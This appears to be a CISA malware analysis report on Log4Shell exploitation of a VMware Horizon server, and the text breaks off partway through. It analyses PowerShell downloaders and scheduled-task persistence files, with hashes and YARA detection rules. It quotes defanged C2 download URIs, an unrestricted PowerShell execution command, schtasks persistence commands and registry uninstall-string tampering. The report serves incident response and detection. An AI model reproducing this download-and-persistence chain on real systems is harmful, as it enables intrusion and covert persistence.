{
  "markdown": "\n\u00a0\n\n\n\n\nNotification\n\nThis report is provided \"as is\" for informational purposes only. The Departcenment of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained herein. The DHS does not endorse any commercial product or service referenced in this bulletin or otherwise.\nThis document is marked TLP:WHITE--Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol (TLP), see http://www.cisa.gov/tlp.\n\nSummary\n\nDescription\nSince December 2021, multiple threat actor groups have exploited Log4Shell on unpatched, public-facing VMware Horizon and Unified Access Gateway (UAG) servers. From May through June 2022, CISA provided remote incident support at an organization where CISA observed suspected Log4Shell PowerShell downloads. During remote support, CISA confirmed the organization was compromised by malicious cyber actors who exploited Log4Shell in a VMware Horizon server that did not have patches or workarounds applied. CISA analyzed five malware samples obtained from the organization\u2019s network: two malicious PowerShell files, two Extensible Markup Language (XML) files, and a 64-bit compiled Python Portable Executable (PE) file.\n\n\t\t\tThe two PowerShell files are Trojan downloaders designed to download malicious files from a command and control (C2) server and install them on the compromised system. One of the scripts also checks for and installs Nmap if it is not installed on the compromised system. The two XML files are for scheduling tasks for persistence. The 64-bit compiled Python PE file is designed to perform scans for IP addresses of live hosts, open ports, and services running on those hosts.\nFor more information on Log4Shell, see:\u00a0\n\nJoint CSA Malicious Cyber Actors Continue to Exploit Log4Shell in VMware Horizon Systems,\nCISA\u2019s Apache Log4j Vulnerability Guidance webpage,\nJoint CSA Mitigating Log4Shell and Other Log4j-Related Vulnerabilities, and\nCISA\u2019s database of known vulnerable services on the CISA GitHub page.\n\nFor a downloadable copy of IOCs, see: MAR-10386789-1.v1.stix.\nSubmitted Files (5)\n1d459b9909adf98690635c62ea005009ede8eb9a665b8703fe2ad0b0c414816b (this.ps1)\n4cdd06a36858ac32a09606bfecb54b517ad41a6aac1e37ca56bb1c193f8174cf (RuntimeService.exe)\n76a2979d965d42f99558ca6ecd97734697249667291a3013d611e310a03f550e (ps.ps1)\nc357879e2c1013dcf999bcdc65372eacf0895af4a4b4bad2b7d28108d3e7c46a (this.xml)\ne3d2e6b5cd422de1be7e6aa830b91115d204ba5e87c77b6431f3313e0930a697 (that.xml)\nAdditional Files (8)\n3b4d726bd366e7439367fa78a186dfa9b641d3b2ad354fd915581b6567480f94 (nmap.exe)\n407d60626707baee29fb9f2597dd32cfd544ff46df7f76e51ff0b79b3ffce3f2 (this.xml)\n42c844c62ad1b7ae1925973a9b6845b40d4f626a4895cba9ae9e3e3de3f7973a (n.zip)\n6408217e10fac9f6549ffaaab328bcfeed4a7ebea71f3dcf60f6186e1b21b501 (that.xml)\n817046c4fe89cd44dbb613cdac2f0c165e2b47d2b5245911ca6fabdda89d1691 (this.ps1)\nb050749c87399f9978cc6eaea7d25405fc0d099a14c169f5c5f63b8b6ec98b0f (RuntimeService.exe)\ne6bc8aa44233312058704b4d5954c45b4160841f470dd7f6d13c08940e61a7bb (ps.ps1)\nfb833ecd1b1050304f364f879b8b1f7b7136e9c4a21aaf0a6c6b3f419e892d6d (elasticsearch.nse)\nIPs (1)\n66.70.238.65\n\nFindings\n\n1d459b9909adf98690635c62ea005009ede8eb9a665b8703fe2ad0b0c414816b\nTags\ndownloaderloadertrojan\nDetails\n\n\n\nName\nthis.ps1\n\n\nSize\n7962 bytes\n\n\nType\nASCII text, with very long lines, with CRLF line terminators\n\n\nMD5\n8aedb094121903a3bfc3dade34f48126\n\n\nSHA1\ned1aad906c2d63c8593708fb685655b891a02854\n\n\nSHA256\n1d459b9909adf98690635c62ea005009ede8eb9a665b8703fe2ad0b0c414816b\n\n\nSHA512\n2c09fb3defdd4810c89d3acaa57fdf3fd1ca9cffe6db43bab73bc629db817d273254be9c35d9cdb161cd0f9c35f5537efafe68bf83d7adb7d022600fd26e6e89\n\n\nssdeep\n192:Ki17MYm59jl5VlxN17MYmoFW2SvjkrvVlxN17MYm7rY2E2/:KIwZ99wnZ2wbrY9W\n\n\nEntropy\n5.256359\n\n\nPath\nC:\\Users\\Public\\Downloads\\this.ps1\n\n\n\nAntivirus\n\n\n\nESET\nPowerShell/TrojanDownloader.Agent.EQN trojan\n\n\n\nYARA Rules\n\nrule CISA_10386789_01 : downloader\n\t\t\t\t{\n\t\t\t\t\u00a0\u00a0\u00a0meta:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Author = \"CISA Code & Media Analysis\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Incident = \"10386789\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Date = \"2022-06-08\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Last_Modfied = \"20220613_1130\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Actor = \"n/a\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Category = \"Downloader\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Family = \"n/a\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Description = \"Detects PowerShell downloader samples\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_1 = \"8aedb094121903a3bfc3dade34f48126\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_1 = \"1d459b9909adf98690635c62ea005009ede8eb9a665b8703fe2ad0b0c414816b\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_2 = \"1940ddb77882162f898bc3aae9c67d94\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_2 = \"817046c4fe89cd44dbb613cdac2f0c165e2b47d2b5245911ca6fabdda89d1691\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_3 = \"84aadb11699f0c3ed062f484aa0a622e\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_3 = \"e6bc8aa44233312058704b4d5954c45b4160841f470dd7f6d13c08940e61a7bb\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_4 = \"a439e7a030d52c8d31bf2c140ccf216b\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_4 = \"76a2979d965d42f99558ca6ecd97734697249667291a3013d611e310a03f550e\"\n\t\t\t\t\u00a0\u00a0\u00a0strings:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s0 = { 44 6F 63 75 6D 65 6E 74 73 5C 70 73 2E 70 73 31 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s1 = { 44 6F 77 6E 6C 6F 61 64 73 5C 65 6C 61 73 74 69 63 73 65 61 72 63 68 2E 6E 73 65 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s2 = { 5C 55 6E 69 6E 73 74 61 6C 6C 5C 4E 70 63 61 70 49 6E 73 74 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s3 = { 5C 55 6E 69 6E 73 74 61 6C 6C 5C 4E 6D 61 70 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s4 = { 2F 44 65 6C 65 74 65 20 2F 74 6E 20 22 52 75 6E 74 69 6D 65 20 53 65 72 76 69 63 65 22 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s5 = { 44 6F 77 6E 6C 6F 61 64 73 5C 6E 2E 7A 69 70 22 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s6 = { 5C 4D 69 63 72 6F 73 6F 66 74 5C 57 69 6E 64 6F 77 73 5C 52 75 6E 74 69 6D 65 20 55 70 64 61 74 65 20 53 65 72 76 69 63 65 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s7 = { 44 6F 77 6E 6C 6F 61 64 73 5C 6E 6D 61 70 2E 65 78 65 22 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t8 = { 6D 61 74 63 68 20 22 73 79 73 74 65 6D 70 72 6F 66 69 6C 65 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t9 = { 2D 6E 6F 74 6D 61 74 63 68 20 22 41 70 70 44 61 74 61 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t10 = { 20 6B 69 6C 6C 20 2D 49 64 20 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t11 = { 2F 52 75 6E 20 2F 74 6E 20 22 52 75 6E 74 69 6D 65 20 53 65 72 76 69 63 65 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t12 = { 44 6F 77 6E 6C 6F 61 64 73 5C 74 68 69 73 2E 70 73 31 }\n\t\t\t\t\u00a0\u00a0\u00a0condition:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0all of ($s*) or all of ($t*)\n\t\t\t\t}\n\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\n1d459b9909...\nContains\n66.70.238.65\n\n\n1d459b9909...\nConnected_To\n66.70.238.65\n\n\n1d459b9909...\nDownloaded\ne3d2e6b5cd422de1be7e6aa830b91115d204ba5e87c77b6431f3313e0930a697\n\n\n1d459b9909...\nDownloaded\nc357879e2c1013dcf999bcdc65372eacf0895af4a4b4bad2b7d28108d3e7c46a\n\n\n1d459b9909...\nDownloaded\n4cdd06a36858ac32a09606bfecb54b517ad41a6aac1e37ca56bb1c193f8174cf\n\n\n1d459b9909...\nDownloaded\n42c844c62ad1b7ae1925973a9b6845b40d4f626a4895cba9ae9e3e3de3f7973a\n\n\n1d459b9909...\nDownloaded\n76a2979d965d42f99558ca6ecd97734697249667291a3013d611e310a03f550e\n\n\n\nDescription\nThis artifact is a malicious PowerShell script file downloaded and installed by \"ps.ps1\" (a439e7a030d52c8d31bf2c140ccf216b) . When executed, it stops and deletes the running scheduled tasks below if they exist on the compromised system:\n\n\t\t\t--Begin task name--\n\t\t\t\"Runtime Service\"\n\t\t\t\"\\Microsoft\\Windows\\Runtime Update Service\"\n\t\t\t--End task name--\n\n\t\t\tIt downloads and installs a scheduled task XML file and a PowerShell file below if the file \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\" is installed on the compromised system:\n\n\t\t\t--Begin files--\n\t\t\tC:\\Users\\Public\\Downloads\\that.xml ==> \"9bf865e73bb0bf021af2d4a2ce1abdfe\"\n\t\t\tC:\\Users\\Public\\Documents\\ps.ps1 ==> \"a439e7a030d52c8d31bf2c140ccf216b\"\n\t\t\t--End files--\n\n\t\t\tIt creates a scheduled task named \"\\Microsoft\\Windows\\Runtime Update Service\" from the task specified in the above XML file to execute the file \"C:\\Users\\Public\\Documents\\ps.ps1\" at a specified time of each day for persistence, and then exits it code execution.\n\n\t\t\tDisplayed below is the command used to install the scheduled task named \"\\Microsoft\\Windows\\Runtime Update Service\":\n\n\t\t\t--Begin scheduled task--\n\t\t\t\"schtasks.exe /Create /XML \"C:\\Users\\Public\\Downloads\\that.xml\" /tn \"\\Microsoft\\Windows\\Runtime Update Service\"\n\t\t\t--End scheduled task--\n\n\t\t\tIf not, it checks if the Nmap file path \"C:\\Program Files (x86)\\Nmap\" is installed on the victim's system. If the file path exists, it will search for the running process named \"RuntimeService\", which is the 64-bit Python compiled PE file. It will attempt to terminate and delete it from \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\" if the file is running. It downloads and installs a scheduled task XML file and the Python compiled PE file. It copies the PE file from \"C:\\Users\\Public\\Downloads\\RuntimeService.exe\" to the Nmap installed folder \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\".\n\n\t\t\tDisplayed below are the scheduled task XML file and PE file installed at runtime:\n\n\t\t\t--Begin files--\n\t\t\tC:\\Users\\Public\\Downloads\\this.xml ==> \"e4ea99b9a35807bae6bc2885b220c498\"\n\t\t\tC:\\Users\\Public\\Downloads\\RuntimeService.exe ==> copied to C:\\Program Files (x86)\\Nmap\\RuntimeService.exe. ==> \"eda057d006561e28563813b2e81b9fd0\"\n\t\t\t--End files--\n\n\t\t\tIt creates a scheduled task named \"Runtime Service\" from the task specified in the above \"this.xml\" file on the victim's system to execute the PE file \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\" with predefined arguments in every system reboot for persistence.\n\n\t\t\tDisplayed below is the command used to install the scheduled task named \"Runtime Service\":\n\n\t\t\t--Begin scheduled task--\n\t\t\t\"schtasks.exe /Create /XML \"C:\\Users\\Public\\Downloads\\this.xml\" /tn \"Runtime Service\"\n\t\t\t--End scheduled task--\n\n\t\t\tIf the Nmap file path \"C:\\Program Files (x86)\\Nmap\" is not installed on the victim's system, it will download a zip file from its C2 server to \"C:\\Users\\Public\\Downloads\\n.zip\". The zip file contains the Nmap installer and the NSE file. It installs the Nmap installer on the compromised system with the command below:\n\n\t\t\t--Begin command--\n\t\t\tstart \"C:\\Users\\Public\\Downloads\\Nmap.exe\" \"/S\"\n\t\t\t--End command--\n\n\t\t\tIt will download the these files RuntimeService.exe, this.xml, that.xml, and ps.ps1 files from its C2 server into \"C:\\Users\\Public\\Downloads\\\".\n\n\t\t\tIt copies the NSE file from the current directory \"C:\\Users\\Public\\Downloads\\elasticsearch.nse\" to \"C:\\Program Files (x86)\\Nmap\\scripts\\elasticsearch.nse\", and the Python PE file \"C:\\Users\\Public\\Downloads\\RuntimeService.exe\" to \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\". It creates scheduled tasks named \"Runtime Service\" and \"Runtime Update Service\" from the task specified in the above XML files on the victim's system for persistence.\n\n\t\t\tIt deletes the command line for removing the Nmap application and the Nmap project's packet capture (Npcap) installed from the registry by changing the \"UninstallString\" registry value to a null string under the following registry keys:\n\n\t\t\t--Begin registry entries--\n\t\t\t\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\NpcapInst\"\n\t\t\t\"UninstallString\"=\"C:\\Program Files\\Npcap\\uninstall.exe\"\n\n\t\t\t\"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Nmap\"\n\t\t\t\"UninstallString\" = \"C:\\Program Files (x86)\\Nmap\\uninstall.exe\"\n\t\t\t--End registry entries--\n\n\t\t\tIt deletes the files below from the victim's system:\n\n\t\t\t--Begin files--\n\t\t\tC:\\Users\\Public\\Downloads\\nmap.exe\n\t\t\tC:\\Users\\Public\\Downloads\\elasticsearch.nse\n\t\t\tC:\\Users\\Public\\Downloads\\n.zip\n\t\t\tC:\\Users\\Public\\Downloads\\RuntimeService.exe\n\t\t\tC:\\Users\\Public\\Downloads\\this.xml\n\t\t\tC:\\Users\\Public\\Downloads\\that.xml\"\n\t\t\t--End files--\n\n\t\t\tDisplayed below are the list of Uniform Resource Identifiers (URIs) used to download the files above:\n\n\t\t\t--Begin URIs--\n\t\t\thttp[:]//66[.]70[.]238[.]65/RuntimeService.exe\n\t\t\thttp[:]//66[.]70[.]238[.]65/this.xml\n\t\t\thttp[:]//66[.]70[.]238[.]65/that.xml\n\t\t\thttp[:]//66[.]70[.]238[.]65/ps.ps1\n\t\t\thttp[:]//66[.]70[.]238[.]65/n.zip\n\t\t\t--End URIs--\nScreenshots\n \n\nFigure 1 - A snippet of the contents of the file \"this.ps1\".\n\n\n\n76a2979d965d42f99558ca6ecd97734697249667291a3013d611e310a03f550e\nTags\ndownloaderloadertrojan\nDetails\n\n\n\nName\nps.ps1\n\n\nSize\n5059 bytes\n\n\nType\nUTF-8 Unicode (with BOM) text, with very long lines, with CRLF line terminators\n\n\nMD5\na439e7a030d52c8d31bf2c140ccf216b\n\n\nSHA1\n234634e2659cea2c34b522664ba5f2be33b9f7df\n\n\nSHA256\n76a2979d965d42f99558ca6ecd97734697249667291a3013d611e310a03f550e\n\n\nSHA512\n92bc008e549a0a47cfcd9cbc9f2692c822dc6a1410d20d31fb15e2bd788fccae30f1213cb103ccf3650fb03339c1ee8d5ed3f80f548933b209f1aaa4ea660e46\n\n\nssdeep\n96:vVoVjizdtFKr5UY6YZTpcXLxunpt17zIZzYuWmZd/lxq4:vVeLd6YZTpcXLxE17MZ9/Zd9xq4\n\n\nEntropy\n5.197759\n\n\nPath\nC:\\Users\\Public\\Documents\\ps.ps1\n\n\n\nAntivirus\n\n\n\nESET\nPowerShell/TrojanDownloader.Agent.EQN trojan\n\n\n\nYARA Rules\n\nrule CISA_10386789_01 : downloader\n\t\t\t\t{\n\t\t\t\t\u00a0\u00a0\u00a0meta:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Author = \"CISA Code & Media Analysis\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Incident = \"10386789\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Date = \"2022-06-08\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Last_Modfied = \"20220613_1130\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Actor = \"n/a\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Category = \"Downloader\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Family = \"n/a\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Description = \"Detects PowerShell downloader samples\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_1 = \"8aedb094121903a3bfc3dade34f48126\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_1 = \"1d459b9909adf98690635c62ea005009ede8eb9a665b8703fe2ad0b0c414816b\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_2 = \"1940ddb77882162f898bc3aae9c67d94\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_2 = \"817046c4fe89cd44dbb613cdac2f0c165e2b47d2b5245911ca6fabdda89d1691\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_3 = \"84aadb11699f0c3ed062f484aa0a622e\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_3 = \"e6bc8aa44233312058704b4d5954c45b4160841f470dd7f6d13c08940e61a7bb\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_4 = \"a439e7a030d52c8d31bf2c140ccf216b\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_4 = \"76a2979d965d42f99558ca6ecd97734697249667291a3013d611e310a03f550e\"\n\t\t\t\t\u00a0\u00a0\u00a0strings:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s0 = { 44 6F 63 75 6D 65 6E 74 73 5C 70 73 2E 70 73 31 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s1 = { 44 6F 77 6E 6C 6F 61 64 73 5C 65 6C 61 73 74 69 63 73 65 61 72 63 68 2E 6E 73 65 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s2 = { 5C 55 6E 69 6E 73 74 61 6C 6C 5C 4E 70 63 61 70 49 6E 73 74 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s3 = { 5C 55 6E 69 6E 73 74 61 6C 6C 5C 4E 6D 61 70 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s4 = { 2F 44 65 6C 65 74 65 20 2F 74 6E 20 22 52 75 6E 74 69 6D 65 20 53 65 72 76 69 63 65 22 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s5 = { 44 6F 77 6E 6C 6F 61 64 73 5C 6E 2E 7A 69 70 22 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s6 = { 5C 4D 69 63 72 6F 73 6F 66 74 5C 57 69 6E 64 6F 77 73 5C 52 75 6E 74 69 6D 65 20 55 70 64 61 74 65 20 53 65 72 76 69 63 65 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s7 = { 44 6F 77 6E 6C 6F 61 64 73 5C 6E 6D 61 70 2E 65 78 65 22 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t8 = { 6D 61 74 63 68 20 22 73 79 73 74 65 6D 70 72 6F 66 69 6C 65 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t9 = { 2D 6E 6F 74 6D 61 74 63 68 20 22 41 70 70 44 61 74 61 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t10 = { 20 6B 69 6C 6C 20 2D 49 64 20 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t11 = { 2F 52 75 6E 20 2F 74 6E 20 22 52 75 6E 74 69 6D 65 20 53 65 72 76 69 63 65 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t12 = { 44 6F 77 6E 6C 6F 61 64 73 5C 74 68 69 73 2E 70 73 31 }\n\t\t\t\t\u00a0\u00a0\u00a0condition:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0all of ($s*) or all of ($t*)\n\t\t\t\t}\n\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\n76a2979d96...\nDownloaded_By\n1d459b9909adf98690635c62ea005009ede8eb9a665b8703fe2ad0b0c414816b\n\n\n76a2979d96...\nDownloaded\n4cdd06a36858ac32a09606bfecb54b517ad41a6aac1e37ca56bb1c193f8174cf\n\n\n76a2979d96...\nConnected_To\n66.70.238.65\n\n\n76a2979d96...\nDownloaded\ne3d2e6b5cd422de1be7e6aa830b91115d204ba5e87c77b6431f3313e0930a697\n\n\n76a2979d96...\nDownloaded\nc357879e2c1013dcf999bcdc65372eacf0895af4a4b4bad2b7d28108d3e7c46a\n\n\n76a2979d96...\nContains\n66.70.238.65\n\n\n\nDescription\nThis artifact is a malicious PowerShell script file downloaded and installed by \"this.ps1\" (8aedb094121903a3bfc3dade34f48126) and \"ps.ps1\" (a439e7a030d52c8d31bf2c140ccf216b). This file and \"84aadb11699f0c3ed062f484aa0a622e\" have similar code functions. When executed, it checks and stops any process running from the specified paths:\n\n\t\t\t--Begin file paths--\n\t\t\tC:\\Windows\\Temp\n\t\t\tC:\\Windows\\System32\\config\\systemprofile\n\t\t\t--End file paths--\n\n\t\t\tIf not, it checks if the scheduled task named \"Runtime Service\" is installed on the victim's system. If not, it downloads and installs the XML scheduled task file \"C:\\Users\\Public\\Downloads\\this.xml\" (e4ea99b9a35807bae6bc2885b220c498) and creates a scheduled task named \"Runtime Service\" from the task specified in the XML file on the victim's system. This task is designed to run the file \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\" with predefined arguments in every system reboot.\n\n\t\t\tIt checks if the scheduled task named \"\\Microsoft\\Windows\\Runtime Update Service\" is installed on the victim's system. If not, it downloads and installs the XML scheduled task file \"C:\\Users\\Public\\Downloads\\that.xml\" (9bf865e73bb0bf021af2d4a2ce1abdfe) and creates a scheduled task named \"\\Microsoft\\Windows\\Runtime Update Service\" from the task specified in the XML file on the victim's system. This task is designed to run the PowerShell script file from \"C:\\Users\\Public\\Documents\\ps.ps1\" in a specified date and time.\n\n\t\t\tIt checks if the Nmap file path \"C:\\Program Files (x86)\\Nmap\" is installed on the victim's system. If the file path is not installed, it downloads a PowerShell file from its C2 server to \"C:\\Users\\Public\\Downloads\\this.ps1\" (8aedb094121903a3bfc3dade34f48126) before executing it using the command below:\n\n\t\t\t--Begin command--\n\t\t\t\"Powershell.exe -ExecutionPolicy UnRestricted -File \"C:\\Users\\Public\\Downloads\\this.ps1\"\n\t\t\t--End command--\n\n\t\t\tIf the Nmap file path is installed, it checks if the PE file \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\" (eda057d006561e28563813b2e81b9fd0) is also installed on the victim's system. If the PE file is not installed, it downloads and installs the PE file into \"C:\\Users\\Public\\Downloads\\RuntimeService.exe\" (eda057d006561e28563813b2e81b9fd0) if the PE file is not installed on the victim's system. It copies the PE file from \"C:\\Users\\Public\\Downloads\\RuntimeService.exe\" to the Nmap file path \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\". It enables and runs the scheduled task named \"Runtime Service\" to execute the PE file \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\".\n\n\t\t\tIf the PE file is installed, it will attempt to retrieve and verify the last write time of the file with the date and time: \"Sunday, April 24, 2022 11:31:45 AM\" retrieved from the C2 server using the hard-coded URI:\"http[:]//66[.]70[.]238[.]65/txt.txt\".\n\n\t\t\tAnalysis indicates that if the last write time of the file is less than the date and time retrieved from the C2 server, it will search for the running process named \"RuntimeService\" and attempt to terminate and delete it from \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\" if the file is running on the victim's system. It downloads and installs the PE file into \"C:\\Users\\Public\\Downloads\\RuntimeService.exe\". It copies the PE file from \"C:\\Users\\Public\\Downloads\\RuntimeService.exe\" to the Nmap file path \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\". It enables and runs the scheduled task named \"Runtime Service\" to execute the PE file \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\".\n\n\t\t\tIt is designed to delete the other files below before existing its code execution:\n\n\t\t\t--Begin deleted files--\n\t\t\t\"C:\\Users\\Public\\Downloads\\RuntimeService.exe\"\n\t\t\t\"C:\\Users\\Public\\Downloads\\this.xml\"\n\t\t\t\"C:\\Users\\Public\\Downloads\\that.xml\"\n\t\t\t\"C:\\Users\\Public\\Downloads\\this.ps1\"\n\t\t\t--End deleted files--\n\n\t\t\tDisplayed below are the URIs used to download the files above:\n\n\t\t\t--Begin URIs--\n\t\t\thttp[:]//66[.]70[.]238[.]65/RuntimeService.exe\n\t\t\thttp[:]//66[.]70[.]238[.]65/this.xml\n\t\t\thttp[:]//66[.]70[.]238[.]65/that.xml\n\t\t\thttp[:]//66[.]70[.]238[.]65/this.ps1\n\t\t\t--End URIs--\nScreenshots\n \n\nFigure 2 - A snippet of the contents of the PowerShell script file \"ps.ps1\".\n\n\n\ne3d2e6b5cd422de1be7e6aa830b91115d204ba5e87c77b6431f3313e0930a697\nDetails\n\n\n\nName\nthat.xml\n\n\nSize\n3864 bytes\n\n\nType\nXML 1.0 document, Little-endian UTF-16 Unicode text, with CRLF line terminators\n\n\nMD5\n9bf865e73bb0bf021af2d4a2ce1abdfe\n\n\nSHA1\ne0a380e876177d3efed2f36194521d648b10880a\n\n\nSHA256\ne3d2e6b5cd422de1be7e6aa830b91115d204ba5e87c77b6431f3313e0930a697\n\n\nSHA512\ne63aa24f116befcff1df96bf98c0c921730d511f5dace18821a8f0a5c6889adeff1ad263843f2df3e22768f4d04226c3959b7fb31cea9bc65d3469b6b4d056af\n\n\nssdeep\n48:yei1q97AONTUmZL1eD4idocMUF39Qg9c9V9Lvara+iniudupRCRf9ufAuRa7G5XJ:ts+4D4id6h4iGdinigV9ll7EHFnAB+\n\n\nEntropy\n3.570362\n\n\nPath\nC:\\Users\\Public\\Downloads\\that.xml\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\ne3d2e6b5cd...\nDownloaded_By\n1d459b9909adf98690635c62ea005009ede8eb9a665b8703fe2ad0b0c414816b\n\n\ne3d2e6b5cd...\nDownloaded_By\n76a2979d965d42f99558ca6ecd97734697249667291a3013d611e310a03f550e\n\n\ne3d2e6b5cd...\nDownloaded_From\n66.70.238.65\n\n\n\nDescription\nThis artifact is the scheduled task XML file downloaded and installed by \"8aedb094121903a3bfc3dade34f48126\" and \"a439e7a030d52c8d31bf2c140ccf216b\". It contains the task's properties, triggers, actions, conditions, and settings used to create a scheduled task named \"\\Microsoft\\Windows\\Runtime Update Service\" for persistence. It is designed to execute the PowerShell script file from \"C:\\Users\\Public\\Documents\\ps.ps1\" in everyday from January 01, 2022. This file and \"80343fb39fe8657f3f3904509b59d1d2\" have similar code functions.\nScreenshots\n \n\nFigure 3 - A snippet of the contents of the XML file \"that.xml\".\n\n \n\nFigure 4 - The scheduled task named \"Runtime Update Service\" created from the tasks specified in the XML file \"that.xml\" to execute the file \"C:\\Users\\Public\\Documents\\ps.ps1\" at a specified time of each day for persistence.\n\n\n\nc357879e2c1013dcf999bcdc65372eacf0895af4a4b4bad2b7d28108d3e7c46a\nDetails\n\n\n\nName\nthis.xml\n\n\nSize\n3570 bytes\n\n\nType\nXML 1.0 document, Little-endian UTF-16 Unicode text, with CRLF line 